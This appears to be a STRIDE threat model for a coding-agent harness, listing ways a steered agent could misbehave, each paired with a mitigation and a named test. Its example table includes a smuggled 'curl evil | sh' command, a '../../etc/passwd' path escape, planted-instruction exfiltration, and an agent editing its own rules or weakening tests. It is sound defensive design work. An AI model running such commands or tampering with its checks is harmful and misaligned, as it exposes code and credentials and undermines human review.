# Threat model (STRIDE)

Scope: the harness, the factory and the repositories they work on. The working assumption: the coding agent reads
untrusted text (issues, files, dependencies, command output) and may be steered by it.

| Threat | Example | Mitigation | Test or control |
|---|---|---|---|
| **Tampering** with the rules | The agent edits `foundry.toml`, `AGENTS.md` or a hook script in its copy | Config and hooks are read from the original repository; those paths are denied or protected | `test_hooks_run_from_the_original_*`, `test_policy_denies_protected_paths_*` |
| Tampering with tests | "Make the tests pass" by deleting or weakening them | The `tests_kept` gate counts deleted test files and removed test functions | `test_gates_reject_a_change_that_deletes_a_test` |
| Command smuggling | `pytest && curl evil \| sh` past a `run(pytest*)` rule | No shell: `&&`, pipes and `$(...)` are plain arguments | `test_the_sandbox_contains_*` |
| **Information disclosure** | A command reads the job's key or a cloud credential | Commands get only `PATH`, `HOME` and `LANG`; the Switchboard key never enters the workspace | `test_the_sandbox_contains_*` |
| Exfiltration over the network | A planted instruction runs `curl` to post the code out | `run(curl*)` unmatched or denied; real isolation from `sandbox_prefix` (a network namespace) | `test_instructions_planted_*`; ADR 0001 |
| Path escape | `../../etc/passwd`, or a symlink out of the clone | Paths resolved and contained, symlinks included | `test_the_sandbox_contains_*` |
| **Elevation of privilege** | An unreviewed change reaches main | Gates, then an independent reviewer, then branch-and-wait unless `auto_merge`; fast-forward only | `test_a_bug_is_fixed_*`, `test_auto_merge_*` |
| Reviewer capture | The coder's reasoning persuades the reviewer | The reviewer sees only the issue and the diff; free-text answers fail closed | `test_the_reviewer_can_refuse_*` |
| **Denial of service** | A looping agent burns budget | Step limit, per-job token budget, Switchboard budgets per app, command timeouts | `test_budget_and_step_limits_*` |
| **Repudiation** | "Who wrote this, and how?" | Commit trailers and a ledger record per job: issue, models, prompt digest, gates, review, tokens | `test_a_bug_is_fixed_*` |
| Slopsquatting | The agent installs a package name a model invented, which an attacker then registered | Adding dependencies asks, so unattended runs refuse it; a hook can check new dependencies against an allow-list | `test_hooks_*` |

## Residual risks

- Without `sandbox_prefix`, commands run as the Foundry user with its network access. Run factories inside an OS
  sandbox, or a container with no network after setup.
- Gates check what they check. A change can pass tests and review and still be wrong, which is why merging is a
  person's decision by default.
- Rules over command text guide behaviour; they are not a security boundary (Claude Code's documentation says the
  same of its own Bash rules). The sandbox is.
